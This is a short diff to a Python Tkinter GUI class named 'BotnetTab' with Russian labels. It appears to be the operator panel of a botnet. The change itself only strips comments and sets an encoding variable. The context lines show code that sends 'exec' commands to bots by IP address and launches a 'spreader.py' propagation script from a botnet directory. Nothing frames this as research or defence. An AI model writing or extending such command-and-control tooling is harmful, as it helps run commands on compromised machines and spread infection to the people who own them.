@@ -70,7 +70,6 @@ class BotnetTab(ttk.Frame):
         self.output_text = scrolledtext.ScrolledText(cmd_frame, height=4, bg="white")
         self.output_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
-    # Методы ботов
     def _auto_refresh(self):
         self.refresh_bots()
         self.after(5000, self._auto_refresh)
@@ -161,7 +160,6 @@ class BotnetTab(ttk.Frame):
         for ip in ips:
             self._send_raw(f"exec:{ip}:{cmd}")
 
-    # Управление спредером
     def toggle_spreader(self):
         if self.spreader_process and self.spreader_process.poll() is None:
             self.spreader_process.terminate()
@@ -175,11 +173,12 @@ class BotnetTab(ttk.Frame):
 
     def _run_spreader(self, count):
         try:
-            # Запускаем spreader.py как отдельный процесс
             script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'botnet', 'spreader.py')
+            env = os.environ.copy()
+            env['PYTHONIOENCODING'] = 'utf-8'
             self.spreader_process = subprocess.Popen(
                 ["python", script_path, "--count", str(count)],
-                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=env
             )
             self.btn_start_spread.config(text="Остановить спредер")
             for line in iter(self.spreader_process.stdout.readline, ''):
